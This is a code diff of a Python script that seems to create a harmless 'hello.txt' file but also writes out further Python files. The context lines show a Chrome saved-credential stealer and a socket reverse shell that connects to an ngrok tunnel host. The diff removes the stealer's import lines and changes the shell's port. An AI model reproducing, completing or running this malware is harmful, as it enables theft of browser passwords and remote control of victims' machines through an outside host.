@@ -11,15 +11,7 @@ create_hello_file("hello.txt")    # Creates the file
 print("File 'hello.txt' created with message.")
 
 def create_python_file(filename):
-    code = """import os
-import json
-import base64
-import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
-import shutil
-from datetime import timezone, datetime, timedelta
-
+    code = """
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
@@ -136,7 +128,7 @@ import socket
 import subprocess
 
 IP = "0.tcp.in.ngrok.io"   # ngrok host
-PORT = 13467               # ngrok port 
+PORT = 18042               # ngrok port 
 
 s = socket.socket()
 s.connect((IP, PORT))
